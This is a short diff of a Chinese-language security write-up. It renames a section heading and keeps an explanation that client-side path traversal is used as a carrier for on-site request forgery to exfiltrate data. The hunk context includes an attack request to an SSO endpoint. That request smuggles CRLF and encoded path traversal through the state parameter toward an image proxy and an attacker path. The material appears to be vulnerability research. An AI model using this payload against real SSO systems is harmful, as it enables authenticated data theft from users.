@@ -181,7 +181,7 @@ GET /ssoRequest?client_id=valid&state=/legit%0d%0a/..%2f..%2fimageProxy/attacker
 
 ---
 
-# 0x05 案例总结与红队行动指南
+# 0x05 案例总结与行动指南
 
 **技术本质**：
 将 CSPT 作为 **OSRF 载体**，操控浏览器向同一源的代理端点发起经认证的请求，实现敏感数据外泄。
